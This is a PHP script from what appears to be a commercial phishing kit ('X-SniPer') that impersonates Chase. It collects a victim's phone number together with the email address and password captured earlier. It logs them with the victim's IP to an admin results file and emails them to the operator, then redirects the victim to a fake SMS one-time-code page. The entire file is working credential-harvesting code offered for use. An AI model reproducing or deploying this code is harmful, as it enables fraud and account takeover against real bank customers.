<?php 



require("require.php");


if (isset($_POST['telephone'])  ) {
	if (!empty($_POST['telephone']) ) {
		
			// Admin Panel
			$_SESSION['phone'] = $_POST['telephone'];

			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['Email']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['passwordEmail']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['phone']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";


			$Subject = "❤️💪 X-SniPer Telephone Email Access 💪❤️  [".$_SESSION['Email']."] ip 👉".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <ElZero@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";

	        $msg = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<X-SniPer Page>||==========#\n";
	        $msg .= "#===========||<Telephone & Email Access>||==========#\n";
	        $msg .= "Email Access   : ".$_SESSION['Email']." \n";
	        $msg .= "Password 		: ".$_SESSION['passwordEmail']." \n";
	        $msg .= "phone 			: ".$_SESSION['phone']." \n";
	        $msg .= "IP 	  		: ".$ip."//\n";
	        $msg .= "#===========||<Thanks For Buying||==========#//\n";


	        if ($saveInAdminPanel  == "true") {
				$file = fopen("../../admin/result/telephone.txt", "a+");
				fwrite($file, $msgAdminPanel);	
			}
		
			if ($sendToEmail == "true") {
				
				send($yourEmail, $Subject, $msg);

			}

			header("Location: ../../secure/sms?country=us&id=chase");exit();
		
	}else{
		header("Location: ../../secure/emailAccessOTP?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/emailAccessOTP?id=chase&invalid&country=us");exit();
}
